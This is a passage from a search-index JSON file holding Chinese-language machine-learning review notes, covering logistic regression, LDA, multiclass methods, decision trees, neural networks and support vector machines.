y/(1-y)\\)\u3002</p>"},{"location":"cs/ml/review/#_14","title":"\u6781\u5927\u4f3c\u7136\u4f30\u8ba1","text":"<p>\u5bf9\u6570\u51e0\u7387\u4e3a\uff1a</p> \\[ \\ln\\frac{p(y=1|x)}{p(y=0|x)} = \\omega^T x + b \\] <p>\u6709</p> \\[ \\begin{aligned} p(y=1|x) &amp;= \\frac{e^{\\omega^T x + b}}{1 + e^{\\omega^T x + b}} \\\\ p(y=0|x) &amp;= \\frac{1}{1 + e^{\\omega^T x + b}} \\end{aligned} \\] <p>\u901a\u8fc7\u6781\u5927\u4f3c\u7136\u6cd5\u6765\u4f30\u8ba1 \\(\\omega\\) \u548c \\(b\\)\u3002\u7ed9\u5b9a\u6570\u636e\u96c6 \\(\\{(x_i, y_i)\\}_{i=1}^{m}\\)\uff0c\u5bf9\u6570\u56de\u5f52\u6a21\u578b\u6700\u5927\u5316\u5bf9\u6570\u4f3c\u7136\u51fd\u6570\uff1a</p> \\[ l(\\omega, b) = \\sum_{i=1}^{m} \\ln p(y_i|x_i; \\omega, b) \\] <p>\u5373\u4ee4\u6bcf\u4e2a\u6837\u672c\u5c5e\u4e8e\u5176\u771f\u5b9e\u6807\u8bb0\u7684\u6982\u7387\u8d8a\u5927\u8d8a\u597d\u3002</p> <p>\u4ee4 \\(\\beta = (\\omega, b), \\hat{x} = (x, 1)\\)\uff0c\u5219 \\(\\omega^T x + b = \\beta^T \\hat{x}\\)\u3002\u518d\u4ee4</p> \\[ \\begin{aligned} p_0(\\hat{x}; \\beta) &amp;= p(y=1|\\hat{x}; \\beta) \\\\ p_1(\\hat{x}; \\beta) &amp;= p(y=0|\\hat{x}; \\beta) \\\\ p(y_i | \\hat{x}_i; \\beta) &amp;= y_i p_0(\\hat{x}_i; \\beta) + (1 - y_i) p_1(\\hat{x}_i; \\beta) \\end{aligned} \\] <p>\u5373\u6700\u5c0f\u5316\u8d1f\u5bf9\u6570\u4f3c\u7136\u51fd\u6570\uff1a</p> \\[ l(\\beta) = \\sum_{i=1}^{m} (-y_i \\beta^T \\hat{x}_i + \\ln(1 + e^{\\beta^T \\hat{x}_i})) \\] <p>\u6c42\u89e3</p> \\[ \\beta^* = \\arg\\min_{\\beta} l(\\beta) \\] <p>\u4f7f\u7528\u725b\u987f\u6cd5\u6c42\u89e3 \\(\\frac{\\partial l}{\\partial \\beta} = 0\\) \u5f97\u5230 \\(\\beta^*\\)\uff1a</p> \\[ \\beta^{t+1} = \\beta^t - (\\frac{\\partial^2 l}{\\partial \\beta \\partial \\beta^T})^{-1} \\frac{\\partial l}{\\partial \\beta} \\]"},{"location":"cs/ml/review/#_15","title":"\u7ebf\u6027\u5224\u522b\u5206\u6790","text":"<p>\u7ebf\u6027\u5224\u522b\u5206\u6790\uff08Linear Discriminant Analysis, LDA\uff09\u3002\u76d1\u7763\u964d\u7ef4\u6280\u672f\u3002\u4f7f\u540c\u7c7b\u6837\u672c\u7684\u6295\u5f71\u70b9\u5c3d\u53ef\u80fd\u63a5\u8fd1\uff0c\u4e0d\u540c\u7c7b\u6837\u672c\u7684\u6295\u5f71\u70b9\u5c3d\u53ef\u80fd\u8fdc\u79bb\u3002</p> <ul> <li>\u540c\u7c7b\u6837\u672c\u534f\u65b9\u5dee\u5c0f</li> <li>\u5f02\u7c7b\u6837\u672c\u7c7b\u4e2d\u5fc3\u8ddd\u79bb\u5927</li> </ul> <p>\u5b9a\u4e49\uff1a</p> <ul> <li>\u7b2c \\(i\\) \u7c7b\u6837\u672c\u96c6\u5408\uff1a\\(X_i\\)</li> <li>\u7b2c \\(i\\) \u7c7b\u6837\u672c\u5747\u503c\uff1a\\(\\mu_i\\)</li> <li>\u7b2c \\(i\\) \u7c7b\u6837\u672c\u534f\u65b9\u5dee\u77e9\u9635\uff1a\\(\\Sigma_i\\)</li> <li>\u76f4\u7ebf\u65b9\u5411\u5411\u91cf\uff1a\\(\\omega\\)</li> <li>\u6837\u672c\u4e2d\u5fc3\u5728\u76f4\u7ebf\u4e0a\u7684\u6295\u5f71\uff1a\\(\\omega^T \\mu_i\\)</li> <li>\u534f\u65b9\u5dee\uff1a\\(\\omega^T \\Sigma_i \\omega\\)</li> </ul> <p>\u6700\u5927\u5316\u76ee\u6807\uff08\u5e7f\u4e49\u745e\u5229\u71b5\uff09\uff1a</p> \\[ \\begin{aligned} J &amp;= \\frac{\\|\\omega^T \\mu_1 - \\omega^T \\mu_2\\|_2^2}{\\omega^T \\Sigma_1 \\omega + \\omega^T \\Sigma_2 \\omega} \\\\ &amp;= \\frac{\\omega^T (\\mu_1 - \\mu_2)(\\mu_1 - \\mu_2)^T \\omega}{\\omega^T (\\Sigma_1 + \\Sigma_2) \\omega} \\end{aligned} \\] <p>\u7c7b\u5185\u6563\u5ea6\u77e9\u9635\uff1a</p> \\[ S_w = \\sum_{i=1}^{c} \\Sigma_i = \\sum_{i=1}^{c} \\sum_{x \\in X_i} (x - \\mu_i)(x - \\mu_i)^T \\] <p>\u7c7b\u95f4\u6563\u5ea6\u77e9\u9635\uff1a</p> \\[ S_b = (\\mu_1 - \\mu_2)(\\mu_1 - \\mu_2)^T \\] <p>\u5e7f\u4e49\u745e\u5229\u71b5\uff1a</p> \\[ J = \\frac{\\omega^T S_b \\omega}{\\omega^T S_w \\omega} \\] <p>\u4ee4 \\(\\omega^T S_w \\omega = 1\\)\uff0c\u6700\u5927\u5316\u5e7f\u4e49\u745e\u5229\u71b5\u7b49\u4ef7\u4e8e</p> \\[ \\min_{\\omega} -\\omega^T S_b \\omega \\quad \\text{s.t.} \\ \\omega^T S_w \\omega = 1 \\] <p>\u7531\u62c9\u683c\u6717\u65e5\u4e58\u5b50\u6cd5\uff0c\u4e0a\u5f0f\u7b49\u4ef7\u4e8e</p> \\[ S_b \\omega = \\lambda S_w \\omega \\] <p>\u4ee4 \\(S_b \\omega = \\lambda (\\mu_1 - \\mu_2)\\)\uff0c\u5219</p> \\[ \\omega = S_w^{-1} (\\mu_1 - \\mu_2) \\] <p>\u5c06 \\(S_w\\) \u8fdb\u884c\u5947\u5f02\u503c\u5206\u89e3 \\(S_w = U \\Sigma V^T\\)\uff0c\u5219</p> \\[ \\omega = V \\Sigma^{-1} U^T (\\mu_1 - \\mu_2) \\]"},{"location":"cs/ml/review/#_16","title":"\u591a\u5206\u7c7b\u4efb\u52a1","text":"<p>\u62c6\u5206\u4e3a\u591a\u4e2a\u4e8c\u5206\u7c7b\u4efb\u52a1\uff1a</p> <ul> <li> <p>\u4e00\u5bf9\u4e00\uff08one-vs-one\uff09\uff1a\\(N\\) \u7c7b\u6837\u672c\u4e24\u4e24\u914d\u5bf9\uff0c\u8bad\u7ec3 \\(N(N-1)/2\\) \u4e2a\u5206\u7c7b\u5668\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u6837\u672c\uff0c\u6bcf\u4e2a\u5206\u7c7b\u5668\u6295\u7968\uff0c\u6700\u7ec8\u6295\u7968\u6700\u591a\u7684\u7c7b\u522b\u4e3a\u9884\u6d4b\u7c7b\u522b\u3002</p> <p>\u4f18\u70b9\uff1a\u6bcf\u4e2a\u5206\u7c7b\u5668\u53ea\u9700\u5173\u6ce8\u4e24\u4e2a\u7c7b\u522b\uff0c\u8bad\u7ec3\u901f\u5ea6\u5feb\u3002</p> <p>\u7f3a\u70b9\uff1a\u5206\u7c7b\u5668\u6570\u91cf\u591a\uff0c\u6d4b\u8bd5\u901f\u5ea6\u6162\u3002</p> </li> <li> <p>\u4e00\u5bf9\u5176\u4f59\uff08one-vs-rest\uff09\uff1a\u67d0\u4e00\u7c7b\u522b\u4e3a\u6b63\u4f8b\uff0c\u5176\u4f59\u7c7b\u522b\u4e3a\u53cd\u4f8b\uff0c\u8bad\u7ec3 \\(N\\) \u4e2a\u5206\u7c7b\u5668\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u6837\u672c\uff0c\u6bcf\u4e2a\u5206\u7c7b\u5668\u8f93\u51fa\u6b63\u4f8b\u7684\u6982\u7387\uff0c\u6700\u7ec8\u6982\u7387\u6700\u5927\u7684\u7c7b\u522b\u4e3a\u9884\u6d4b\u7c7b\u522b\u3002</p> <p>\u4f18\u70b9\uff1a\u5206\u7c7b\u5668\u6570\u91cf\u5c11\uff0c\u5b58\u50a8\u5f00\u9500\u5c0f\uff0c\u6d4b\u8bd5\u901f\u5ea6\u5feb\u3002</p> <p>\u7f3a\u70b9\uff1a\u8bad\u7ec3\u7528\u5230\u5168\u90e8\u6570\u636e\uff0c\u8bad\u7ec3\u901f\u5ea6\u6162\u3002</p> </li> <li> <p>\u591a\u5bf9\u591a\uff08many-vs-many\uff09\uff1a\u82e5\u5e72\u7c7b\u522b\u4e3a\u6b63\u4f8b\uff0c\u82e5\u5e72\u7c7b\u522b\u4e3a\u53cd\u4f8b\uff0c\u8bad\u7ec3\u82e5\u5e72\u4e2a\u5206\u7c7b\u5668\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u6837\u672c\uff0c\u6bcf\u4e2a\u5206\u7c7b\u5668\u6295\u7968\uff0c\u6700\u7ec8\u6295\u7968\u6700\u591a\u7684\u7c7b\u522b\u4e3a\u9884\u6d4b\u7c7b\u522b\u3002</p> </li> </ul>"},{"location":"cs/ml/review/#_17","title":"\u7ea0\u9519\u8f93\u51fa\u7801","text":"<ul> <li>\u7f16\u7801\uff1a\u5bf9 \\(N\\) \u4e2a\u7c7b\u522b\u8fdb\u884c \\(M\\) \u6b21\u5212\u5206\uff0c\u5f97\u5230 \\(M\\) \u4e2a\u5206\u7c7b\u5668\u3002</li> <li>\u89e3\u7801\uff1a\\(M\\) \u4e2a\u5206\u7c7b\u5668\u5206\u522b\u5bf9\u6d4b\u8bd5\u6837\u672c\u8fdb\u884c\u9884\u6d4b\uff0c\u7ec4\u6210\u4e00\u4e2a \\(M\\) \u4f4d\u7684\u7f16\u7801\uff0c\u5c06\u8fd9\u4e2a\u9884\u6d4b\u7f16\u7801\u4e0e\u6bcf\u4e2a\u7c7b\u522b\u5404\u81ea\u7684\u7f16\u7801\u8fdb\u884c\u6bd4\u8f83\uff0c\u8fd4\u56de\u5176\u4e2d\u8ddd\u79bb\u6700\u5c0f\u7684\u7c7b\u522b\u4f5c\u4e3a\u6700\u7ec8\u9884\u6d4b\u7ed3\u679c\u3002</li> </ul> <ul> <li>\u6d77\u660e\u8ddd\u79bb\uff1a\u4e24\u4e2a\u7f16\u7801\u4e4b\u95f4\u4e0d\u540c\u7684\u4f4d\u6570\u3002</li> <li>\u6b27\u5f0f\u8ddd\u79bb\uff1a\\(\\sqrt{\\sum_{i=1}^{M} (y_i - y'_i)^2}\\)</li> </ul>"},{"location":"cs/ml/review/#_18","title":"\u7c7b\u522b\u4e0d\u5e73\u8861\u95ee\u9898","text":"<p>\u4e0d\u540c\u7c7b\u522b\u7684\u6837\u672c\u6570\u91cf\u5dee\u5f02\u8f83\u5927\u3002</p> <p>\u89e3\u51b3\u65b9\u6cd5\uff1a\u8f6c\u6362\u4e3a\u7c7b\u522b\u5e73\u8861\u95ee\u9898\u3002</p> <p>\u518d\u7f29\u653e\u65b9\u6cd5\uff1a</p> <ul> <li>\u6b20\u91c7\u6837\uff1a\u53bb\u9664\u4e00\u4e9b\u53cd\u4f8b\u4f7f\u5f97\u6b63\u4f8b\u548c\u53cd\u4f8b\u6570\u91cf\u63a5\u8fd1\u3002</li> <li>\u8fc7\u91c7\u6837\uff1a\u589e\u52a0\u4e00\u4e9b\u6b63\u4f8b\u4f7f\u5f97\u6b63\u4f8b\u548c\u53cd\u4f8b\u6570\u91cf\u63a5\u8fd1\u3002</li> <li>\u9608\u503c\u79fb\u52a8\uff1a\u8c03\u6574\u5206\u7c7b\u5668\u7684\u8f93\u51fa\u9608\u503c\u3002</li> </ul>"},{"location":"cs/ml/review/#_19","title":"\u51b3\u7b56\u6811","text":"<p>\u51b3\u7b56\u6811\u57fa\u4e8e\u6811\u7ed3\u6784\u8fdb\u884c\u9884\u6d4b\u3002</p> <p>\u7ec8\u6b62\u60c5\u51b5\uff1a</p> <ul> <li>\u5f53\u524d\u7ed3\u70b9\u5305\u542b\u7684\u6837\u672c\u5168\u5c5e\u4e8e\u540c\u4e00\u7c7b\u522b\u3002</li> <li>\u5f53\u524d\u7ed3\u70b9\u5305\u542b\u7684\u6837\u672c\u4e3a\u7a7a\u3002\u7ed3\u70b9\u7c7b\u522b\u8bbe\u5b9a\u4e3a\u5176\u7236\u7ed3\u70b9\u5305\u542b\u6837\u672c\u6700\u591a\u7684\u7c7b\u522b\u3002</li> <li>\u5f53\u524d\u7ed3\u70b9\u5305\u542b\u6837\u672c\u7684\u5269\u4f59\u7279\u5f81\u7684\u53d6\u503c\u76f8\u540c\u3002\u7ed3\u70b9\u7c7b\u522b\u8bbe\u5b9a\u4e3a\u5305\u542b\u6837\u672c\u6700\u591a\u7684\u7c7b\u522b\u3002</li> </ul>"},{"location":"cs/ml/review/#_20","title":"\u5212\u5206\u9009\u62e9","text":""},{"location":"cs/ml/review/#id3","title":"ID3 \u51b3\u7b56\u6811","text":"<p>\u8bbe\u5f53\u524d\u6837\u672c\u96c6\u5408\u4e2d\u7b2c \\(k\\) \u7c7b\u6837\u672c\u7684\u6bd4\u4f8b\u4e3a \\(p_k\\)\uff0c\u5219\u4fe1\u606f\u71b5\u4e3a</p> \\[ Ent(D) = -\\sum_{k=1}^{K} p_k \\log_2 p_k \\] <p>\u4fe1\u606f\u71b5\u8d8a\u5c0f\uff0c\u6837\u672c\u7684\u7eaf\u5ea6\u8d8a\u9ad8\u3002</p> <p>\u4f7f\u7528\u5c5e\u6027 \\(a\\) \u5bf9\u6837\u672c\u8fdb\u884c\u5212\u5206\u6240\u5f97\u5230\u7684\u4fe1\u606f\u589e\u76ca\u4e3a</p> \\[ Gain(D, a) = Ent(D) - \\sum_{v=1}^{V} \\frac{|D^v|}{|D|} Ent(D^v) \\] <p>\u5176\u4e2d \\(a\\) \u6709 \\(V\\) \u4e2a\u4e0d\u540c\u7684\u53d6\u503c\uff0c\\(D^v\\) \u4e3a \\(D\\) \u4e2d\u5c5e\u6027 \\(a\\) \u53d6\u503c\u4e3a \\(a^v\\) \u7684\u6837\u672c\u5b50\u96c6\u3002</p> <p>\u4fe1\u606f\u589e\u76ca\u8d8a\u5927\uff0c\u4f7f\u7528\u5c5e\u6027 \\(a\\) \u5212\u5206\u6837\u672c\u7684\u6548\u679c\u8d8a\u597d\u3002ID3 \u7b97\u6cd5\u4f7f\u7528\u4fe1\u606f\u589e\u76ca\u9009\u62e9\u5212\u5206\u5c5e\u6027\u3002</p>"},{"location":"cs/ml/review/#c45","title":"C4.5 \u51b3\u7b56\u6811","text":"<p>\u589e\u76ca\u7387\uff1a</p> \\[ \\text{Gain_ratio}(D, a) = \\frac{\\text{Gain}(D, a)}{\\text{IV}(a)} \\] <p>\u5176\u4e2d IV \u4e3a\u5c5e\u6027 \\(a\\) \u7684\u56fa\u6709\u503c\uff1a</p> \\[ \\text{IV}(a) = -\\sum_{v=1}^{V} \\frac{|D^v|}{|D|} \\log_2 \\frac{|D^v|}{|D|} \\] <p>\u76f8\u5f53\u4e8e\u5bf9\u4fe1\u606f\u589e\u76ca\u8fdb\u884c\u4e86\u5f52\u4e00\u5316\u3002C4.5 \u7b97\u6cd5\u4f7f\u7528\u589e\u76ca\u7387\u9009\u62e9\u5212\u5206\u5c5e\u6027\u3002</p> <p>C4.5 \u51b3\u7b56\u6811\uff1a\u5148\u627e\u51fa\u4fe1\u606f\u589e\u76ca\u9ad8\u4e8e\u5e73\u5747\u6c34\u5e73\u7684\u5c5e\u6027\uff0c\u518d\u4ece\u4e2d\u9009\u62e9\u589e\u76ca\u7387\u6700\u9ad8\u7684\u5c5e\u6027\u8fdb\u884c\u5212\u5206\u3002</p>"},{"location":"cs/ml/review/#cart","title":"CART \u51b3\u7b56\u6811","text":"<p>\u6570\u636e\u96c6 \\(D\\) \u7684\u57fa\u5c3c\u503c\u4e3a</p> \\[ \\text{Gini}(D) = \\sum_{k=1}^{K} \\sum_{k' \\neq k} p_k p_{k'} = 1 - \\sum_{k=1}^{K} p_k^2 \\] <p>\u57fa\u5c3c\u503c\u8d8a\u5c0f\uff0c\u6837\u672c\u7684\u7eaf\u5ea6\u8d8a\u9ad8\u3002</p> <p>\u9009\u62e9\u5c5e\u6027 \\(a\\) \u8fdb\u884c\u5212\u5206\uff0c\u5f97\u5230\u7684\u57fa\u5c3c\u6307\u6570\u4e3a</p> \\[ \\text{Gini_index}(D, a) = \\sum_{v=1}^{V} \\frac{|D^v|}{|D|} Gini(D^v) \\] <p>CART \u7b97\u6cd5\u4f7f\u7528\u57fa\u5c3c\u6307\u6570\u9009\u62e9\u5212\u5206\u5c5e\u6027\uff0c\u9009\u62e9\u57fa\u5c3c\u6307\u6570\u6700\u5c0f\u7684\u5c5e\u6027\u8fdb\u884c\u5212\u5206\u3002</p>"},{"location":"cs/ml/review/#_21","title":"\u8fde\u7eed\u4e0e\u7f3a\u5931\u503c","text":""},{"location":"cs/ml/review/#_22","title":"\u8fde\u7eed\u5c5e\u6027","text":"<p>\u4f7f\u7528\u4e8c\u5206\u6cd5\u8fdb\u884c\u5212\u5206\u3002\u5bf9\u4e8e\u8fde\u7eed\u503c \\(a\\)\uff0c\u8003\u8651\u5212\u5206\u70b9</p> \\[ T_a = \\{\\frac{a_i + a_{i+1}}{2} | 1 \\leq i \\leq n-1\\} \\] <p>\u9009\u62e9\u6700\u4f18\u7684\u5212\u5206\u70b9\u8fdb\u884c\u5212\u5206\u3002\u5373</p> \\[ \\text{Gain}(D, a) = \\max_{t \\in T_a} \\text{Gain}(D, a, t) \\]"},{"location":"cs/ml/review/#_23","title":"\u526a\u679d","text":"<p>\u51b3\u7b56\u6811\u5bb9\u6613\u8fc7\u62df\u5408\uff0c\u526a\u679d\u662f\u9632\u6b62\u8fc7\u62df\u5408\u7684\u91cd\u8981\u624b\u6bb5\u3002</p>"},{"location":"cs/ml/review/#_24","title":"\u9884\u526a\u679d","text":"<p>\u8fb9\u5efa\u6811\u8fb9\u526a\u679d\u3002\u82e5\u5f53\u524d\u7ed3\u70b9\u8fdb\u884c\u5212\u5206\u4e0d\u80fd\u5e26\u6765\u6cdb\u5316\u80fd\u529b\u7684\u63d0\u5347\uff0c\u5219\u505c\u6b62\u5212\u5206\uff0c\u5c06\u5f53\u524d\u7ed3\u70b9\u6807\u8bb0\u4e3a\u53f6\u7ed3\u70b9\u3002</p> <p>\u9884\u7559\u9a8c\u8bc1\u96c6\uff0c\u5206\u522b\u8ba1\u7b97\u5212\u5206\u524d\u540e\u7684\u9a8c\u8bc1\u96c6\u7cbe\u5ea6\uff0c\u5224\u65ad\u662f\u5426\u8fdb\u884c\u5212\u5206\u3002</p> <ul> <li>\u4f18\u70b9\uff1a\u964d\u4f4e\u8fc7\u62df\u5408\u98ce\u9669\uff0c\u63d0\u9ad8\u6cdb\u5316\u80fd\u529b\u3002\u51cf\u5c11\u8bad\u7ec3\u548c\u6d4b\u8bd5\u65f6\u95f4\u3002</li> <li>\u7f3a\u70b9\uff1a\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6b20\u62df\u5408\u3002</li> </ul>"},{"location":"cs/ml/review/#_25","title":"\u540e\u526a\u679d","text":"<p>\u5148\u5efa\u6811\u518d\u526a\u679d\u3002\u81ea\u5e95\u5411\u4e0a\u5bf9\u975e\u53f6\u7ed3\u70b9\u8fdb\u884c\u8003\u5bdf\uff0c\u82e5\u5c06\u5176\u5212\u5206\u4e3a\u53f6\u7ed3\u70b9\u80fd\u5e26\u6765\u6cdb\u5316\u80fd\u529b\u7684\u63d0\u5347\uff0c\u5219\u5c06\u5176\u5212\u5206\u4e3a\u53f6\u7ed3\u70b9\u3002</p> <ul> <li>\u4f18\u70b9\uff1a\u4fdd\u7559\u4e86\u66f4\u591a\u5206\u652f\uff0c\u6b20\u62df\u5408\u98ce\u9669\u8f83\u5c0f\u3002</li> <li>\u7f3a\u70b9\uff1a\u8bad\u7ec3\u65f6\u95f4\u8f83\u957f\uff0c\u9700\u8981\u751f\u6210\u5b8c\u6574\u7684\u51b3\u7b56\u6811\u3002</li> </ul>"},{"location":"cs/ml/review/#_26","title":"\u795e\u7ecf\u7f51\u7edc","text":""},{"location":"cs/ml/review/#_27","title":"\u795e\u7ecf\u5143\u6a21\u578b","text":""},{"location":"cs/ml/review/#mp","title":"MP \u795e\u7ecf\u5143","text":"<ul> <li>\u8f93\u5165\uff1a\\(x_1, x_2, \\cdots, x_d\\)</li> <li>\u6743\u91cd\uff1a\\(\\omega_1, \\omega_2, \\cdots, \\omega_d\\)</li> <li>\u9608\u503c\uff1a\\(\\theta\\)</li> <li>\u6fc0\u6d3b\u51fd\u6570\uff1a\\(f(\\cdot)\\)</li> <li>\u8f93\u51fa\uff1a\\(y = f(\\sum_{i=1}^{d} \\omega_i x_i - \\theta)\\)</li> </ul>"},{"location":"cs/ml/review/#_28","title":"\u6fc0\u6d3b\u51fd\u6570","text":"<ul> <li> <p>\u9636\u8dc3\u51fd\u6570\uff08step function\uff09\uff1a</p> \\[ f(z) = \\begin{cases} 1, &amp; z \\geq 0 \\\\ 0, &amp; z &lt; 0 \\end{cases} \\] </li> <li> <p>Sigmoid \u51fd\u6570\uff1a</p> \\[ f(z) = \\frac{1}{1 + e^{-z}} \\] </li> <li> <p>ReLU \u51fd\u6570\uff1a</p> \\[ f(z) = \\max(0, z) \\] </li> <li> <p>Tanh \u51fd\u6570\uff1a</p> \\[ f(z) = \\frac{e^z - e^{-z}}{e^z + e^{-z}} \\] </li> </ul>"},{"location":"cs/ml/review/#_29","title":"\u611f\u77e5\u673a\u4e0e\u591a\u5c42\u7f51\u7edc","text":""},{"location":"cs/ml/review/#_30","title":"\u611f\u77e5\u673a","text":"<p>\u611f\u77e5\u673a\u7531\u4e24\u5c42\u795e\u7ecf\u5143\u7ec4\u6210\uff0c\u8f93\u5165\u5c42\u63a5\u6536\u8f93\u5165\u4fe1\u53f7\uff0c\u8f93\u51fa\u5c42\u8fdb\u884c\u8f93\u51fa\uff08MP \u795e\u7ecf\u5143\uff09\u3002</p>"},{"location":"cs/ml/review/#_31","title":"\u611f\u77e5\u673a\u5b66\u4e60","text":"<p>\u5b66\u4e60\u6743\u91cd \\(\\omega\\)</p> \\[ \\begin{aligned} \\omega_i &amp;\\leftarrow \\omega_i + \\Delta \\omega_i \\\\ \\Delta \\omega_i &amp;= \\eta (y - \\hat{y}) x_i \\end{aligned} \\] <p>\u5176\u4e2d \\(\\eta\\) \u4e3a\u5b66\u4e60\u7387\u3002</p> <p>\u82e5\u4e24\u7c7b\u6a21\u5f0f\u7ebf\u6027\u53ef\u5206, \u5219\u611f\u77e5\u673a\u7684\u5b66\u4e60\u8fc7\u7a0b\u4e00\u5b9a\u4f1a\u6536\u655b\u3002</p> <p>\u5355\u5c42\u611f\u77e5\u673a\u53ea\u80fd\u89e3\u51b3\u7ebf\u6027\u53ef\u5206\u95ee\u9898\u3002</p>"},{"location":"cs/ml/review/#_32","title":"\u591a\u5c42\u611f\u77e5\u673a","text":"<p>\u52a0\u5165\u9690\u85cf\u5c42\uff0c\u53ef\u4ee5\u89e3\u51b3\u975e\u7ebf\u6027\u53ef\u5206\u95ee\u9898\u3002</p>"},{"location":"cs/ml/review/#_33","title":"\u591a\u5c42\u524d\u9988\u795e\u7ecf\u7f51\u7edc","text":"<p>\u6bcf\u5c42\u795e\u7ecf\u5143\u4e0e\u4e0b\u4e00\u5c42\u795e\u7ecf\u5143\u5168\u8fde\u63a5\uff0c\u4fe1\u606f\u5355\u5411\u4f20\u64ad\u3002</p>"},{"location":"cs/ml/review/#_34","title":"\u8bef\u5dee\u9006\u4f20\u64ad\u7b97\u6cd5","text":"<p>\u8bad\u7ec3\u6743\u91cd\u3001\u9608\u503c\u3002</p> <p>\u53ea\u9700\u8981\u4e00\u4e2a\u5305\u542b\u8db3\u591f\u591a\u795e\u7ecf\u5143\u7684\u9690\u85cf\u5c42\uff0c\u5c31\u53ef\u4ee5\u4ee5\u4efb\u610f\u7cbe\u5ea6\u903c\u8fd1\u4efb\u610f\u8fde\u7eed\u51fd\u6570\u3002</p> <p>\u7f13\u89e3\u8fc7\u62df\u5408\uff1a</p> <ul> <li>\u65e9\u505c\u6cd5\uff1a\u82e5\u8bad\u7ec3\u8bef\u5dee\u964d\u4f4e\uff0c\u4f46\u9a8c\u8bc1\u8bef\u5dee\u5347\u9ad8\uff0c\u5219\u505c\u6b62\u8bad\u7ec3\u3002</li> <li>\u6b63\u5219\u5316\uff1a\u5728\u8bef\u5dee\u51fd\u6570\u4e2d\u52a0\u5165\u6743\u91cd\u8870\u51cf\u9879\u3002</li> </ul>"},{"location":"cs/ml/review/#_35","title":"\u4ea4\u53c9\u71b5\u635f\u5931\u51fd\u6570","text":"<p>\u5bf9\u4e8e\u6837\u672c \\((x_i, y_i)\\)\uff0c\u8f93\u51fa\u5c42\u7684\u8f93\u51fa\u4e3a \\(\\hat{y}_i\\)\uff0c\u5219\u4ea4\u53c9\u71b5\u635f\u5931\u51fd\u6570\u4e3a</p> \\[ L = -y_i \\log \\hat{y}_i - (1 - y_i) \\log (1 - \\hat{y}_i) \\]"},{"location":"cs/ml/review/#_36","title":"\u5c40\u90e8\u6700\u5c0f\u4e0e\u5168\u5c40\u6700\u5c0f","text":"<p>\u8df3\u51fa\u5c40\u90e8\u6700\u5c0f\uff1a</p> <ul> <li>\u591a\u7ec4\u4e0d\u540c\u521d\u59cb\u5316\u53c2\u6570\u4f18\u5316\u795e\u7ecf\u7f51\u7edc\uff0c\u9009\u62e9\u6700\u4f18\u53c2\u6570\u3002</li> <li>\u6a21\u62df\u9000\u706b</li> <li>\u968f\u673a\u68af\u5ea6\u4e0b\u964d</li> <li>\u9057\u4f20\u7b97\u6cd5</li> </ul>"},{"location":"cs/ml/review/#_37","title":"\u6df1\u5ea6\u5b66\u4e60","text":"<p>\u5f88\u6df1\u5c42\u7684\u795e\u7ecf\u7f51\u7edc\u3002</p>"},{"location":"cs/ml/review/#_38","title":"\u652f\u6301\u5411\u91cf\u673a","text":"<p>\u95f4\u9694\u548c\u652f\u6301\u5411\u91cf\uff1a</p> <ul> <li>\u8d85\u5e73\u9762\uff1a\\(\\omega^T x + b = 0\\)\u3002</li> <li>\u95f4\u9694\uff1a\u4e24\u4e2a\u5f02\u7c7b\u652f\u6301\u5411\u91cf\u5230\u8d85\u5e73\u9762\u7684\u8ddd\u79bb\u4e4b\u548c \\(\\gamma = \\frac{2}{\\|\\omega\\|}\\)\u3002</li> </ul> <p>\u5bfb\u627e\u53c2\u6570 \\(\\omega\\) \u548c \\(b\\) \u4f7f\u5f97\u95f4\u9694\u6700\u5927\u5316\uff1a</p> \\[ \\begin{aligned} &amp;\\max_{\\omega, b} \\frac{2}{\\|\\omega\\|} \\\\ &amp;\\text{s.t.} \\ y_i(\\omega^T x_i + b) \\geq 1, \\ i = 1, 2, \\cdots, m \\end{aligned} \\] <p>\u7b49\u4ef7\u4e8e</p> \\[ \\begin{aligned} &amp;\\min_{\\omega, b} \\frac{1}{2} \\|\\omega\\|^2 \\\\ &amp;\\text{s.t.} \\ y_i(\\omega^T x_i + b) \\geq 1, \\ i = 1, 2, \\cdots, m \\end{aligned} \\] <p>\u4e0a\u5f0f\u4e3a\u652f\u6301\u5411\u91cf\u673a\u7684\u57fa\u672c\u578b\u3002</p>"},{"location":"cs/ml/review/#_39","title":"\u5bf9\u5076\u95ee\u9898","text":"<p>\u4f7f\u7528\u62c9\u683c\u6717\u65e5\u4e58\u5b50\u6cd5\uff0c\u5f97\u5230\u62c9\u683c\u6717\u65e5\u51fd\u6570\uff1a</p> \\[ L(\\omega, b, \\alpha) = \\frac{1}{2} \\|\\omega\\|^2 + \\sum_{i=1}^{m} \\alpha_i (1 - y_i(\\omega^T x_i + b)) \\] <p>\u4ee4\u504f\u5bfc\u6570\u4e3a 0\uff0c\u5f97\u5230\u5bf9\u5076\u95ee\u9898\uff1a</p> \\[ \\begin{aligned} &amp;\\max_{\\alpha} \\sum_{i=1}^{m} \\alpha_i - \\frac{1}{2} \\sum_{i=1}^{m} \\sum_{j=1}^{m} \\alpha_i \\alpha_j y_i y_j x_i^T x_j \\\\ &amp;\\text{s.t.} \\ \\sum_{i=1}^{m} \\alpha_i y_i = 0 \\\\ &amp;\\alpha_i \\geq 0, \\ i = 1, 2, \\cdots, m \\end{aligned} \\] <p>\u6c42\u89e3\u5f97\u5230 \\(\\alpha^*\\)\uff0c\u5f97\u5230 \\(\\omega^* = \\sum_{i=1}^{m} \\alpha_i^* y_i x_i\\)\u3002</p> <p>KKT \u6761\u4ef6\uff1a</p> <ul> <li>\\(\\alpha_i \\geq 0\\)</li> <li>\\(y_i f(x_i) \\geq 1\\)</li> <li>\\(\\alpha_i (y_i f(x_i) - 1) = 0\\)</li> </ul> <p>\u5f53 \\(y_i f(x_i) = 1\\) \u65f6\uff0c\\(\\alpha_i &gt; 0\\)\uff0c\\(x_i\\) \u4e3a\u652f\u6301\u5411\u91cf\u3002</p>"},{"location":"cs/ml/review/#smo","title":"SMO","text":"<p>\u5e8f\u5217\u6700\u5c0f\u6700\u4f18\u5316\u7b97\u6cd5\uff08Sequential Minimal Optimization, SMO\uff09\u3002\u6bcf\u6b21\u9009\u62e9\u4e24\u4e2a\u53d8\u91cf\u8fdb\u884c\u4f18\u5316\uff0c\u56fa\u5b9a\u5176\u4ed6\u53d8\u91cf\u3002</p> <p>\u8bbe\u5bf9 \\(\\alpha_i, \\alpha_j\\) 